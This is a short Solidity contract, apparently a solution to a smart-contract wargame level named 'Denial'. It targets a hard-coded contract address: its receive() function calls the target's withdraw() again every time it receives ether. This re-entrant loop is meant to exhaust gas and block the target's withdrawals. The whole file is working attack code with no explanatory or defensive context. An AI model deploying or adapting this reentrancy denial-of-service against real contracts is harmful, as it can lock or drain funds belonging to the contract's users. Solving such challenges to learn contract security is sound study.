// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDenial{
    function withdraw() external;
}

contract Denial{

    IDenial contra = IDenial(0x36d1342ACE9B92C59fd167F4d7bD2746393987f2);

    receive() external payable{
        contra.withdraw();
    }
}